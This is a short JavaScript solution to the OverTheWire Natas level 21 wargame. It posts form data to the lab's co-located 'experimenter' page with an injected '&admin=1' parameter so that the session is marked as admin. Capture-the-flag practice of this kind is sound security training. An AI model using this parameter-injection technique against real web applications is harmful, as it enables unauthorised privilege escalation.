url_colocate = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug';
//url = 'http://natas21.natas.labs.overthewire.org/index.php';
params = 'align=left&fontsize=50%25&bgcolor=blue&submit=Update';
//truestring = "<br>You are an admin";

injected_query = "&admin=1"; //Inject into $_REQUEST, note the & parameter added

xhr = new XMLHttpRequest();
xhr.open('POST',url_colocate,false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params+injected_query);
